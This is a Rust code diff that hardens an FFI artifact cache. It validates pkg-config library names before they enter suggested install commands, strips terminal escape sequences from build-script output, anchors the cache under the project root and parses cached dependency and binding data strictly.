@@ -19,6 +19,7 @@ use std::path::{Path, PathBuf};
 use crate::diag::{Diagnostic, SourceDefect};
 use crate::naming::{WRAPPER_END_SENTINEL, WRAPPER_SENTINEL_PREFIX};
 use crate::pkginfo::{CrateVersion, FeatureName, PackageName, PkgInfo};
+use ipe_diagnostics::terminal::TerminalSafe;
 
 // ── crate-name gate ─────────────────────────────────────────────────────────
 
@@ -401,6 +402,44 @@ pub fn slugify(name: &str) -> String {
         .collect()
 }
 
+/// The suffix that marks a cache entry as one installed crate's consumer manifest.
+const CONSUMER_SUFFIX: &str = ".consumer.json";
+
+/// The artifact file names for one bound crate, relative to the cache directory.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct ArtifactNames {
+    /// The `.ipei` type-environment seed.
+    pub ipei: String,
+    /// The `kernel.json` call registry.
+    pub kernel_json: String,
+    /// The `_bindings.rs` wrapper module.
+    pub bindings: String,
+    /// The `coverage.md` over-drop report.
+    pub coverage: String,
+    /// The injectable Ipê interface module.
+    pub interface: String,
+    /// The consumer manifest.
+    pub consumer: String,
+    /// The validated inspection document.
+    pub pkg_json: String,
+}
+
+impl ArtifactNames {
+    /// The artifact file names for `slug`.
+    #[must_use]
+    pub fn for_slug(slug: &str) -> Self {
+        Self {
+            ipei: format!("{slug}.ipei"),
+            kernel_json: format!("{slug}.kernel.json"),
+            bindings: format!("{slug}_bindings.rs"),
+            coverage: format!("{slug}.coverage.md"),
+            interface: format!("{slug}.ipe"),
+            consumer: format!("{slug}{CONSUMER_SUFFIX}"),
+            pkg_json: format!("{slug}.pkg.json"),
+        }
+    }
+}
+
 /// The artifact paths for one bound crate.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct ArtifactPaths {
@@ -419,10 +458,13 @@ pub struct ArtifactPaths {
     pub consumer: PathBuf,
     /// The validated inspection document (`<slug>.pkg.json`) — the raw
     /// inspector wire JSON that decoded through the [`PkgInfo`] gate. The
-    /// TRUSTED source `load_catalog` re-derives `_bindings.rs` from: the
+    /// TRUSTED source `load_catalog_from` re-derives `_bindings.rs` from: the
     /// stored `_bindings.rs` text is never trusted, only regenerated.
     pub pkg_json: PathBuf,
 }
+
+/// The FFI artifact cache directory, relative to its project root.
+pub const FFI_CACHE_REL: &str = ".ipe/cache/ffi/rust";
 
 /// The project-local FFI artifact cache (`<project>/.ipe/cache/ffi/rust`).
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -435,7 +477,7 @@ impl FfiCache {
     #[must_use]
     pub fn at_project_root(project_root: &Path) -> Self {
         Self {
-            root: project_root.join(".ipe/cache/ffi/rust"),
+            root: project_root.join(FFI_CACHE_REL),
         }
     }
 
@@ -445,23 +487,51 @@ impl FfiCache {
         &self.root
     }
 
+    /// The project root this cache is anchored under — the jail every
+    /// wrapper crate must resolve inside.
+    ///
+    /// # Errors
+    ///
+    /// [`Diagnostic::WireMalformed`] carrying
+    /// [`crate::diag::WireDefect::CacheRootUnanchored`] when the cache is not
+    /// at `<project>/.ipe/cache/ffi/rust`.
+    pub fn project_root(&self) -> Result<&Path, Diagnostic> {
+        let unanchored = || Diagnostic::WireMalformed {
+            context: "FFI cache".to_owned(),
+            defect: crate::diag::WireDefect::CacheRootUnanchored {
+                got: self.root.to_string_lossy().into_owned(),
+            },
+        };
+        if !self.root.ends_with(FFI_CACHE_REL) {
+            return Err(unanchored());
+        }
+        let depth = Path::new(FFI_CACHE_REL).components().count();
+        let root = self.root.ancestors().nth(depth).ok_or_else(unanchored)?;
+        Ok(if root.as_os_str().is_empty() {
+            Path::new(".")
+        } else {
+            root
+        })
+    }
+
     /// The artifact paths for a slug.
     #[must_use]
     pub fn artifact_paths(&self, slug: &str) -> ArtifactPaths {
+        let names = ArtifactNames::for_slug(slug);
         ArtifactPaths {
-            ipei: self.root.join(format!("{slug}.ipei")),
-            kernel_json: self.root.join(format!("{slug}.kernel.json")),
-            bindings: self.root.join(format!("{slug}_bindings.rs")),
-            coverage: self.root.join(format!("{slug}.coverage.md")),
-            interface: self.root.join(format!("{slug}.ipe")),
-            consumer: self.root.join(format!("{slug}.consumer.json")),
-            pkg_json: self.root.join(format!("{slug}.pkg.json")),
+            ipei: self.root.join(names.ipei),
+            kernel_json: self.root.join(names.kernel_json),
+            bindings: self.root.join(names.bindings),
+            coverage: self.root.join(names.coverage),
+            interface: self.root.join(names.interface),
+            consumer: self.root.join(names.consumer),
+            pkg_json: self.root.join(names.pkg_json),
         }
     }
 
     /// Emit and write all artifacts for a validated package. `inspection_json`
     /// is the raw inspector wire text that decoded into `pkg`; it is persisted
-    /// as `<slug>.pkg.json`, the sole source `load_catalog` re-derives the
+    /// as `<slug>.pkg.json`, the sole source `load_catalog_from` re-derives the
     /// whole consumer-side view from through the validated decode gate. The
     /// other six artifacts are debug/watch projections the loader never
     /// trusts.
@@ -481,7 +551,7 @@ impl FfiCache {
         std::fs::create_dir_all(&self.root).map_err(|e| io_err(&self.root, &e))?;
         let paths = self.artifact_paths(&slugify(pkg.name()));
         let iface = crate::interface::crate_interface(pkg);
-        let consumer_json = emit_consumer_json(pkg, &iface)?;
+        let consumer_json = emit_consumer_json(pkg, &iface, self)?;
         let writes: [(&Path, String); 7] = [
             (
                 &paths.ipei,
@@ -534,6 +604,43 @@ impl FfiCache {
 
 // ── pkg-config missing-library detection ────────────────────────────────────
 
+/// The longest `pkg-config` library name [`SysLibName::parse`] accepts.
+pub const SYS_LIB_NAME_MAX_LEN: usize = 128;
+
+/// A `pkg-config` library name in the `pkg-config` charset, safe to place in a suggested shell command.
+///
+/// ASCII letters, digits, and `.`, `_`, `+`, `-`, opening with a letter or
+/// digit (so it never reads as a command-line option), at most
+/// [`SYS_LIB_NAME_MAX_LEN`] bytes. The name is scraped from untrusted
+/// build-script output and lands inside an `apt install …` line the user may
+/// copy and run; a value that holds a shell metacharacter or whitespace has no
+/// representation, so no install hint can carry one.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct SysLibName(String);
+
+impl SysLibName {
+    /// Parse `raw`, or `None` when it falls outside the `pkg-config` charset or length bound.
+    #[must_use]
+    pub fn parse(raw: &str) -> Option<Self> {
+        let opens_with_alphanumeric = raw
+            .chars()
+            .next()
+            .is_some_and(|c| c.is_ascii_alphanumeric());
+        let legal = opens_with_alphanumeric
+            && raw.len() <= SYS_LIB_NAME_MAX_LEN
+            && raw
+                .chars()
+                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '+' | '-'));
+        legal.then(|| Self(raw.to_owned()))
+    }
+
+    /// The parsed name.
+    #[must_use]
+    pub fn as_str(&self) -> &str {
+        &self.0
+    }
+}
+
 /// A parsed pkg-config "not found" failure: the missing system library and
 /// the Rust crate whose build script reported it.
 ///
@@ -541,18 +648,32 @@ impl FfiCache {
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct MissingSystemLib {
     /// The `pkg-config` library name (e.g. `wayland-client`).
-    pub system_lib: String,
-    /// The Rust `-sys` crate that required it (e.g. `wayland-sys`).
-    pub crate_name: String,
+    pub system_lib: SysLibName,
+    /// The Rust `-sys` crate that required it (e.g. `wayland-sys`), when the
+    /// failure named one that parses as a crate name.
+    pub crate_name: Option<CrateName>,
 }
 
-/// Trim and strip control characters from a name extracted out of raw
-/// build-script stderr. A system-library or crate name is rendered into a styled
-/// diagnostic; an ANSI escape or other control byte carried in the raw stderr
-/// must not reach the terminal and forge markup, so it is removed at the parse
-/// boundary (the typed value downstream is always terminal-safe).
+/// Trim and strip control characters from a name extracted out of raw build-script stderr.
+///
+/// An ANSI escape or other control byte carried in the raw stderr is removed
+/// before the name is parsed, so the parse sees the characters a terminal
+/// would show.
 fn sanitize_extracted_name(raw: &str) -> String {
-    raw.trim().chars().filter(|c| !c.is_control()).collect()
+    TerminalSafe::sanitize(raw.trim())
+        .as_str()
+        .chars()
+        .filter(|&c| c != '\n' && c != '\t')
+        .collect()
+}
+
+/// Parse a missing-library failure's two names, or `None` when the library name does not parse.
+fn missing_system_lib(sys_lib: &str, crate_name: Option<&str>) -> Option<MissingSystemLib> {
+    Some(MissingSystemLib {
+        system_lib: SysLibName::parse(&sanitize_extracted_name(sys_lib))?,
+        crate_name: crate_name
+            .and_then(|name| CrateName::parse(&sanitize_extracted_name(name)).ok()),
+    })
 }
 
 /// The raw inspector error channel from an inspection document, best-effort.
@@ -574,7 +695,9 @@ pub fn inspection_error_log(inspection_json: &str) -> Vec<String> {
 /// - Package `<lib>` was not found (or not found in the pkg-config search path)
 ///
 /// Returns `None` when no pkg-config signature is present (the failure has a
-/// different cause).
+/// different cause), or when the named library does not parse as a
+/// [`SysLibName`]: such a failure is summarised like any other, with no
+/// install hint.
 #[must_use]
 pub fn detect_missing_system_lib(errors: &[String]) -> Option<MissingSystemLib> {
     for line in errors {
@@ -584,10 +707,7 @@ pub fn detect_missing_system_lib(errors: &[String]) -> Option<MissingSystemLib> 
             && let Some((sys_lib, rest)) = rest.split_once("` required by crate `")
             && let Some((crate_name, _)) = rest.split_once("` was not found")
         {
-            return Some(MissingSystemLib {
-                system_lib: sanitize_extracted_name(sys_lib),
-                crate_name: sanitize_extracted_name(crate_name),
-            });
+            return missing_system_lib(sys_lib, Some(crate_name));
         }
         // Secondary form from pkg-config itself:
         // "Package '<lib>' was not found in the pkg-config search path."
@@ -597,12 +717,8 @@ pub fn detect_missing_system_lib(errors: &[String]) -> Option<MissingSystemLib> 
             && let Some(rest) = line.strip_prefix("Package '")
             && let Some((sys_lib, _)) = rest.split_once('\'')
         {
-            return Some(MissingSystemLib {
-                system_lib: sanitize_extracted_name(sys_lib),
-                // No crate name in this form — leave empty; the caller
-                // fills it from context when available.
-                crate_name: String::new(),
-            });
+            // No crate name in this form; the caller fills it from context.
+            return missing_system_lib(sys_lib, None);
         }
     }
     None
@@ -699,9 +815,11 @@ const PKG_CONFIG_INSTALL_HINTS: &[(&str, &str, &str, &str)] = &[
 ///
 /// Looks up `sys_lib` in the curated table first; falls back to a generic
 /// "install the `-dev` package that provides `<lib>.pc`" message when the
-/// library is not in the table.
+/// library is not in the table. Only a parsed [`SysLibName`] reaches the
+/// suggested command.
 #[must_use]
-pub fn install_hint_for(sys_lib: &str) -> String {
+pub fn install_hint_for(sys_lib: &SysLibName) -> String {
+    let sys_lib = sys_lib.as_str();
     for &(key, deb, fed, brew) in PKG_CONFIG_INSTALL_HINTS {
         if key == sys_lib {
             let mut parts: Vec<String> = Vec::new();
@@ -726,6 +844,23 @@ pub fn install_hint_for(sys_lib: &str) -> String {
     )
 }
 
+/// Strip ANSI escape sequences, control characters, and hiding or reordering
+/// format characters from a foreign string (rustc/build-script stderr) before
+/// interpolating it into a diagnostic, keeping it on one line.
+///
+/// A length-capped but un-stripped foreign string can carry terminal control
+/// codes that forge markup or corrupt a structured output consumer. The rules
+/// are [`TerminalSafe::sanitize`]'s, the one sanitiser every user-facing text
+/// passes; the line break it keeps is dropped here, since the value is shown
+/// inline.
+fn strip_foreign_str(s: &str) -> String {
+    TerminalSafe::sanitize(s)
+        .as_str()
+        .chars()
+        .filter(|&c| c != '\n')
+        .collect()
+}
+
 /// Summarise the raw inspector error strings into a short human-readable
 /// message for the `--verbose`-less case.
 ///
@@ -733,59 +868,6 @@ pub fn install_hint_for(sys_lib: &str) -> String {
 /// available under `--verbose` (the CLI layer adds that escape hatch around
 /// the call site).
 #[must_use]
-/// Strip ANSI escape sequences and non-printable control characters from a
-/// foreign string (rustc/build-script stderr) before interpolating it into a
-/// diagnostic. A length-capped but un-stripped foreign string can carry
-/// terminal control codes that forge markup or corrupt a structured output
-/// consumer. Two passes:
-///
-/// 1. Remove ANSI CSI sequences (`ESC [ … <letter>`) and OSC sequences
-///    (`ESC ] … BEL/ST`) via a small state machine — the two sequence families
-///    that rustc's colour output uses.
-/// 2. Filter out remaining control characters except tab (`\t`), which is
-///    printable in a terminal context.
-fn strip_foreign_str(s: &str) -> String {
-    let mut out = String::with_capacity(s.len());
-    let mut chars = s.chars().peekable();
-    while let Some(c) = chars.next() {
-        if c == '\x1b' {
-            // Consume the escape sequence body without emitting it.
-            match chars.peek() {
-                Some('[') => {
-                    // CSI sequence: ESC [ <params> <final-byte> (final byte in 0x40–0x7E).
-                    let _ = chars.next(); // consume '['
-                    for inner in chars.by_ref() {
-                        if ('\x40'..='\x7e').contains(&inner) {
-                            break; // final byte consumed
-                        }
-                    }
-                }
-                Some(']') => {
-                    // OSC sequence: ESC ] <body> BEL or ESC \.
-                    let _ = chars.next(); // consume ']'
-                    loop {
-                        match chars.next() {
-                            None | Some('\x07') => break,
-                            Some('\x1b') if chars.peek() == Some(&'\\') => {
-                                let _ = chars.next();
-                                break;
-                            }
-                            _ => {}
-                        }
-                    }
-                }
-                _ => {
-                    // Unknown escape: consume only the ESC itself (already done).
-                }
-            }
-        } else if c == '\t' || !c.is_control() {
-            out.push(c);
-        }
-        // Other control chars (NUL, BEL, BS, CR, DEL, …) are dropped.
-    }
-    out
-}
-
 pub fn summarise_inspector_errors(errors: &[String]) -> String {
     // Look for the first `error[` or `error:` line from rustc/cargo — that is
     // the root-cause line, not the noise of `cargo:rerun-if-env-changed=…`.
@@ -849,11 +931,9 @@ pub fn install_from_inspection(
         // caller and the CLI act on, not the raw string.
         if let Some(missing) = detect_missing_system_lib(pkg.errors()) {
             let install_hint = install_hint_for(&missing.system_lib);
-            let crate_name = if missing.crate_name.is_empty() {
-                pkg.name().to_owned()
-            } else {
-                missing.crate_name
-            };
+            let crate_name = missing
+                .crate_name
+                .map_or_else(|| pkg.name().to_owned(), |name| name.as_str().to_owned());
             return Err(Diagnostic::SystemLibraryNotFound {
                 system_lib: missing.system_lib,
                 crate_name,
@@ -884,6 +964,7 @@ pub fn install_from_inspection(
 pub fn emit_consumer_json(
     pkg: &PkgInfo,
     iface: &crate::interface::CrateInterface,
+    cache: &FfiCache,
 ) -> Result<String, Diagnostic> {
     let bindings: Vec<serde_json::Value> = iface
         .bindings
@@ -894,10 +975,10 @@ pub fn emit_consumer_json(
             o.insert("wrapperIdent".into(), b.wrapper_ident.clone().into());
             o.insert("arity".into(), b.arity.into());
             o.insert("sig".into(), b.sig.clone().into());
-            if b.transparent_params.iter().any(Option::is_some) {
+            if !b.transparent_params.is_none() {
                 o.insert(
                     "transparentParams".into(),
-                    serde_json::json!(b.transparent_params),
+                    serde_json::json!(b.transparent_params.slots()),
                 );
             }
             if let Some(r) = &b.transparent_result {
@@ -920,7 +1001,7 @@ pub fn emit_consumer_json(
         "opaqueTypes": iface.opaque_types,
         "opaqueTypeIds": iface.opaque_type_ids,
         "defineTypes": iface.define_types,
-        "cargoDeps": cargo_dep_lines(pkg)?,
+        "cargoDeps": cargo_dep_lines(pkg, cache)?,
         "bindings": bindings,
     });
     if !transparent.is_empty()
@@ -963,8 +1044,21 @@ pub struct InstalledCrate {
     /// the backend's conversion glue is assembled from. Empty for a legacy
     /// cache, whose interface text predates transparency.
     pub transparent_types: std::collections::BTreeMap<String, crate::transparency::TransparentType>,
-    /// Pinned `[dependencies]` lines.
-    pub cargo_deps: Vec<String>,
+    /// The typed `[dependencies]` entries the emitted app crate needs.
+    pub cargo_deps: Vec<CargoDep>,
+    /// The crate's own Cargo package name, the `[dependencies]` key its direct
+    /// pin renders under.
+    ///
+    /// `None` for a legacy cache, which predates the inspection document and
+    /// so cannot prove which of its dependency lines is the direct crate.
+    pub package_name: Option<PackageName>,
+    /// Cargo package name → Rust lib identifier, for every dependency the
+    /// crate's inspection resolved.
+    ///
+    /// The bridge between the two tables `assemble_emit` must keep in
+    /// agreement: the `[dependencies]` key a pin renders under and the
+    /// `::<ident>::` path root emitted code names. Empty for a legacy cache.
+    pub dep_idents: std::collections::BTreeMap<String, crate::naming::RustIdent>,
     /// The structured interface bindings (name, wrapper, arity, signature) —
     /// the data the catalog unification re-renders a demoted module from.
     pub bindings: Vec<crate::interface::InterfaceBinding>,
@@ -1007,9 +1101,91 @@ pub struct InspectedConstFact {
     pub ty: String,
 }
 
-/// Load every installed crate from a project's FFI artifact cache.
+/// Load the catalog of a cache the caller created itself, reading by path.
 ///
-/// An absent cache directory is an empty catalog (a project with no FFI).
+/// An absent cache directory is an empty catalog. This reader follows links
+/// and caps nothing, so it exists only for tests: production loads a
+/// discovered cache through [`load_catalog_from`] over an owner-checked,
+/// no-follow handle.
+///
+/// # Errors
+///
+/// As [`load_catalog_from`].
+#[cfg(any(test, feature = "testing"))]
+pub fn load_catalog(cache_root: &Path) -> Result<Vec<InstalledCrate>, Diagnostic> {
+    if !cache_root.is_dir() {
+        return Ok(Vec::new());
+    }
+    load_catalog_from(&PathCacheSource(cache_root))
+}
+
+/// A readable FFI cache directory the catalog loader draws its artifacts from.
+///
+/// The loader never touches the filesystem itself: every listing and read goes
+/// through the source, so a caller holding the cache as an owner-checked,
+/// no-follow directory handle keeps every read on that same handle.
+pub trait CacheSource {
+    /// The error a listing or read fails with; every loader diagnostic converts into it.
+    type Error: From<Diagnostic>;
+
+    /// The cache directory's path, used only to name artifacts in diagnostics.
+    fn root(&self) -> &Path;
+
+    /// The names of the entries directly inside the cache directory.
+    ///
+    /// # Errors
+    ///
+    /// When the directory cannot be listed.
+    fn entry_names(&self) -> Result<Vec<String>, Self::Error>;
+
+    /// The text of the artifact `name`, or `None` when no such entry exists.
+    ///
+    /// # Errors
+    ///
+    /// When the entry exists but cannot be read as a trusted artifact.
+    fn read_artifact(&self, name: &str) -> Result<Option<String>, Self::Error>;
+}
+
+/// A cache read by path, following links, for a directory the caller owns outright.
+#[cfg(any(test, feature = "testing"))]
+struct PathCacheSource<'a>(&'a Path);
+
+#[cfg(any(test, feature = "testing"))]
+impl CacheSource for PathCacheSource<'_> {
+    type Error = Diagnostic;
+
+    fn root(&self) -> &Path {
+        self.0
+    }
+
+    fn entry_names(&self) -> Result<Vec<String>, Diagnostic> {
+        let io_err = |e: &std::io::Error| Diagnostic::ArtifactIo {
+            path: self.0.to_string_lossy().into_owned(),
+            detail: e.to_string(),
+        };
+        let mut names = Vec::new();
+        for entry in std::fs::read_dir(self.0).map_err(|e| io_err(&e))? {
+            let entry = entry.map_err(|e| io_err(&e))?;
+            names.push(entry.file_name().to_string_lossy().into_owned());
+        }
+        Ok(names)
+    }
+
+    fn read_artifact(&self, name: &str) -> Result<Option<String>, Diagnostic> {
+        let path = self.0.join(name);
+        if !path.is_file() {
+            return Ok(None);
+        }
+        std::fs::read_to_string(&path)
+            .map(Some)
+            .map_err(|e| Diagnostic::ArtifactIo {
+                path: path.to_string_lossy().into_owned(),
+                detail: e.to_string(),
+            })
+    }
+}
+
+/// Load every installed crate from a project's FFI artifact cache, read through `source`.
 ///
 /// `<slug>.pkg.json` is the SOLE source of record: when it exists, EVERY
 /// consumer-side view — interface source, bindings source, module/kernel
@@ -1029,69 +1205,62 @@ pub struct InspectedConstFact {
 ///
 /// `IPE-F4412` for an unreadable artifact; a wire-defect diagnostic for a
 /// malformed consumer manifest, a malformed inspection document, or a missing
-/// wrapper.
-pub fn load_catalog(cache_root: &Path) -> Result<Vec<InstalledCrate>, Diagnostic> {
-    if !cache_root.is_dir() {
-        return Ok(Vec::new());
-    }
-    let io_err = |path: &Path, detail: String| Diagnostic::ArtifactIo {
-        path: path.to_string_lossy().into_owned(),
-        detail,
-    };
-    let mut slugs: Vec<String> = Vec::new();
-    let entries = std::fs::read_dir(cache_root).map_err(|e| io_err(cache_root, e.to_string()))?;
-    for entry in entries {
-        let entry = entry.map_err(|e| io_err(cache_root, e.to_string()))?;
-        let name = entry.file_name().to_string_lossy().into_owned();
-        if let Some(slug) = name.strip_suffix(".consumer.json") {
-            slugs.push(slug.to_owned());
-        }
-    }
+/// wrapper; any error `source` raises while listing or reading.
+pub fn load_catalog_from<S: CacheSource>(source: &S) -> Result<Vec<InstalledCrate>, S::Error> {
+    let mut slugs: Vec<String> = source
+        .entry_names()?
+        .into_iter()
+        .filter_map(|name| name.strip_suffix(CONSUMER_SUFFIX).map(str::to_owned))
+        .collect();
     slugs.sort();
     let mut out = Vec::with_capacity(slugs.len());
     for slug in slugs {
-        out.push(load_installed_crate(cache_root, slug)?);
+        out.push(load_installed_crate(source, slug)?);
     }
     Ok(out)
 }
 
-/// Load and validate ONE installed crate's artifacts (see [`load_catalog`]).
+/// Load and validate ONE installed crate's artifacts (see [`load_catalog_from`]).
 ///
 /// # Errors
 ///
-/// As [`load_catalog`], scoped to this slug's artifacts.
+/// As [`load_catalog_from`], scoped to this slug's artifacts.
 #[allow(clippy::too_many_lines)] // one linear artifact decode-and-cross-check cascade
-fn load_installed_crate(cache_root: &Path, slug: String) -> Result<InstalledCrate, Diagnostic> {
-    let io_err = |path: &Path, detail: String| Diagnostic::ArtifactIo {
-        path: path.to_string_lossy().into_owned(),
-        detail,
-    };
+fn load_installed_crate<S: CacheSource>(
+    source: &S,
+    slug: String,
+) -> Result<InstalledCrate, S::Error> {
     {
         let cache = FfiCache {
-            root: cache_root.to_path_buf(),
+            root: source.root().to_path_buf(),
         };
         let paths = cache.artifact_paths(&slug);
-        let read = |p: &Path| -> Result<String, Diagnostic> {
-            std::fs::read_to_string(p).map_err(|e| io_err(p, e.to_string()))
+        let names = ArtifactNames::for_slug(&slug);
+        let read = |name: &str, path: &Path| -> Result<String, S::Error> {
+            source.read_artifact(name)?.ok_or_else(|| {
+                Diagnostic::ArtifactIo {
+                    path: path.to_string_lossy().into_owned(),
+                    detail: "artifact is missing".to_owned(),
+                }
+                .into()
+            })
         };
         // RE-DERIVE the whole consumer-side view from the validated
         // inspection document — no on-disk projection is trusted as text
-        // (see [`load_catalog`]). A legacy cache written before the
+        // (see [`load_catalog_from`]). A legacy cache written before the
         // `pkg.json` artifact existed has no document to re-derive from; it
         // falls back to the stored projections, whose trust then rests on
-        // the discovery-time ownership/write-boundary gate
-        // (`find_cache_root`) plus the injection-free-by-construction
-        // emitter.
-        if paths.pkg_json.is_file() {
-            let pkg_text = read(&paths.pkg_json)?;
+        // the discovery-time ownership/write-boundary gate the source
+        // enforces plus the injection-free-by-construction emitter.
+        if let Some(pkg_text) = source.read_artifact(&names.pkg_json)? {
             let pkg = PkgInfo::decode_json(&pkg_text)?;
-            return installed_crate_from_pkg(slug, &pkg);
+            return installed_crate_from_pkg(slug, &pkg, &cache).map_err(Into::into);
         }
-        let consumer_text = read(&paths.consumer)?;
-        let interface_source = read(&paths.interface)?;
+        let consumer_text = read(&names.consumer, &paths.consumer)?;
+        let interface_source = read(&names.interface, &paths.interface)?;
         let dep_versions: std::collections::BTreeMap<String, String> =
             std::collections::BTreeMap::new();
-        let bindings_source = read(&paths.bindings)?;
+        let bindings_source = read(&names.bindings, &paths.bindings)?;
         let malformed = |detail: String| Diagnostic::WireMalformed {
             context: format!("consumer manifest `{}`", paths.consumer.display()),
             defect: crate::diag::WireDefect::Json { detail },
@@ -1150,15 +1319,30 @@ fn load_installed_crate(cache_root: &Path, slug: String) -> Result<InstalledCrat
                     .collect()
             })
             .unwrap_or_default();
-        let cargo_deps: Vec<String> = doc
-            .get("cargoDeps")
-            .and_then(serde_json::Value::as_array)
-            .map(|a| {
-                a.iter()
-                    .filter_map(|v| v.as_str().map(str::to_owned))
-                    .collect()
-            })
-            .unwrap_or_default();
+        // Each stored line is parsed back into a typed registry pin under the
+        // exact grammar the manifest emitter renders. A legacy manifest has no
+        // inspection document to re-derive a wrapper crate's source from, so a
+        // `path` line (and every other shape) is refused rather than forwarded
+        // into the emitted `Cargo.toml` unproven.
+        let cargo_deps: Vec<CargoDep> = match doc.get("cargoDeps") {
+            None => Vec::new(),
+            Some(v) => v
+                .as_array()
+                .ok_or_else(|| malformed("`cargoDeps` is not an array".to_owned()))?
+                .iter()
+                .map(|line| {
+                    let line = line.as_str().ok_or_else(|| {
+                        malformed("`cargoDeps` carries a non-string entry".to_owned())
+                    })?;
+                    CargoDep::parse_registry_line(line).map_err(|defect| {
+                        Diagnostic::WireMalformed {
+                            context: format!("consumer manifest `{}`", paths.consumer.display()),
+                            defect,
+                        }
+                    })
+                })
+                .collect::<Result<_, _>>()?,
+        };
         let transparent_types: std::collections::BTreeMap<
             String,
             crate::transparency::TransparentType,
@@ -1194,46 +1378,91 @@ fn load_installed_crate(cache_root: &Path, slug: String) -> Result<InstalledCrat
                 "interface module surfaces a transparent record/union but the manifest \
                  carries no `transparentTypes` — re-run `ipe add` to regenerate the cache"
                     .to_owned(),
-            ));
+            )
+            .into());
         }
         let bindings: Vec<crate::interface::InterfaceBinding> = doc
             .get("bindings")
             .and_then(serde_json::Value::as_array)
-            .map(|a| {
-                a.iter()
-                    .filter_map(|b| {
-                        let get = |k: &str| b.get(k).and_then(serde_json::Value::as_str);
-                        let transparent_params: Vec<Option<String>> = b
-                            .get("transparentParams")
-                            .and_then(serde_json::Value::as_array)
-                            .map(|ps| ps.iter().map(|p| p.as_str().map(str::to_owned)).collect())
-                            .unwrap_or_default();
-                        let transparent_result = b.get("transparentResult").and_then(|r| {
-                            Some(crate::interface::TransparentResult {
-                                type_name: r
-                                    .get("typeName")
-                                    .and_then(serde_json::Value::as_str)?
-                                    .to_owned(),
-                                in_result: r
-                                    .get("inResult")
-                                    .and_then(serde_json::Value::as_bool)?,
-                            })
-                        });
-                        Some(crate::interface::InterfaceBinding {
-                            ref_name: get("refName")?.to_owned(),
-                            wrapper_ident: get("wrapperIdent")?.to_owned(),
-                            arity: usize::try_from(
+            .map_or_else(
+                || Ok(Vec::new()),
+                |a| {
+                    a.iter()
+                        .filter_map(|b| {
+                            let get = |k: &str| b.get(k).and_then(serde_json::Value::as_str);
+                            let ref_name = get("refName")?.to_owned();
+                            let wrapper_ident = get("wrapperIdent")?.to_owned();
+                            let arity = usize::try_from(
                                 b.get("arity").and_then(serde_json::Value::as_u64)?,
                             )
-                            .ok()?,
-                            sig: get("sig")?.to_owned(),
-                            transparent_params,
-                            transparent_result,
+                            .ok()?;
+                            let sig = get("sig")?.to_owned();
+                            // Absent slots mean no parameter converts; present
+                            // slots must align with the binding's arity, or the
+                            // backend would skip (or misapply) a conversion.
+                            // A slot is a transparent type name or `null`; any
+                            // other JSON value is malformed, never read as "no
+                            // conversion".
+                            let transparent_params = b
+                                .get("transparentParams")
+                                .and_then(serde_json::Value::as_array)
+                                .map_or_else(
+                                    || Ok(crate::interface::TransparentParams::None),
+                                    |ps| {
+                                        ps.iter()
+                                            .enumerate()
+                                            .map(|(i, p)| match p {
+                                                serde_json::Value::Null => Ok(None),
+                                                serde_json::Value::String(s) => Ok(Some(s.clone())),
+                                                serde_json::Value::Bool(_)
+                                                | serde_json::Value::Number(_)
+                                                | serde_json::Value::Array(_)
+                                                | serde_json::Value::Object(_) => {
+                                                    Err(malformed(format!(
+                                                        "binding `{ref_name}`: \
+                                                         transparentParams[{i}] is neither a \
+                                                         type name nor null"
+                                                    )))
+                                                }
+                                            })
+                                            .collect::<Result<Vec<_>, Diagnostic>>()
+                                            .and_then(|slots| {
+                                                crate::interface::TransparentParams::aligned(
+                                                    slots, arity,
+                                                )
+                                                .map_err(|drift| {
+                                                    malformed(format!(
+                                                        "binding `{ref_name}`: {drift}"
+                                                    ))
+                                                })
+                                            })
+                                    },
+                                );
+                            let transparent_result = b.get("transparentResult").and_then(|r| {
+                                Some(crate::interface::TransparentResult {
+                                    type_name: r
+                                        .get("typeName")
+                                        .and_then(serde_json::Value::as_str)?
+                                        .to_owned(),
+                                    in_result: r
+                                        .get("inResult")
+                                        .and_then(serde_json::Value::as_bool)?,
+                                })
+                            });
+                            Some(transparent_params.map(|transparent_params| {
+                                crate::interface::InterfaceBinding {
+                                    ref_name,
+                                    wrapper_ident,
+                                    arity,
+                                    sig,
+                                    transparent_params,
+                                    transparent_result,
+                                }
+                            }))
                         })
-                    })
-                    .collect()
-            })
-            .unwrap_or_default();
+                        .collect::<Result<Vec<_>, Diagnostic>>()
+                },
+            )?;
         let wrapper_idents: BTreeSet<String> =
             bindings.iter().map(|b| b.wrapper_ident.clone()).collect();
         // Fail-closed cross-check: every forwarded wrapper must exist in the
@@ -1245,7 +1474,8 @@ fn load_installed_crate(cache_root: &Path, slug: String) -> Result<InstalledCrat
                     "interface forwards to wrapper `{ident}` but `{}` declares no such \
                      `pub fn` — re-run `ipe add` to regenerate the cache",
                     paths.bindings.display()
-                )));
+                ))
+                .into());
             }
         }
         Ok(InstalledCrate {
@@ -1259,6 +1489,8 @@ fn load_installed_crate(cache_root: &Path, slug: String) -> Result<InstalledCrat
             define_types,
             transparent_types,
             cargo_deps,
+            package_name: None,
+            dep_idents: std::collections::BTreeMap::new(),
             bindings,
             wrapper_idents,
             dep_versions,
@@ -1274,14 +1506,21 @@ fn load_installed_crate(cache_root: &Path, slug: String) -> Result<InstalledCrat
 ///
 /// # Errors
 /// A wire-defect diagnostic when a dependency line cannot be rendered.
-pub fn installed_crate_from_pkg(slug: String, pkg: &PkgInfo) -> Result<InstalledCrate, Diagnostic> {
+pub fn installed_crate_from_pkg(
+    slug: String,
+    pkg: &PkgInfo,
+    cache: &FfiCache,
+) -> Result<InstalledCrate, Diagnostic> {
     let mut dep_versions: std::collections::BTreeMap<String, String> =
+        std::collections::BTreeMap::new();
+    let mut dep_idents: std::collections::BTreeMap<String, crate::naming::RustIdent> =
         std::collections::BTreeMap::new();
     for dep in pkg.transitive_deps() {
         dep_versions.insert(
             dep.ident.as_str().to_owned(),
             dep.version.as_str().to_owned(),
         );
+        dep_idents.insert(dep.name.as_str().to_owned(), dep.ident.clone());
     }
     // The asserted-call cross-check facts: crate-top-level FREE functions
     // only (no receiver, no accessor shape, no generics) — the one shape an
@@ -1333,7 +1572,9 @@ pub fn installed_crate_from_pkg(slug: String, pkg: &PkgInfo) -> Result<Installed
         opaque_type_ids: iface.opaque_type_ids,
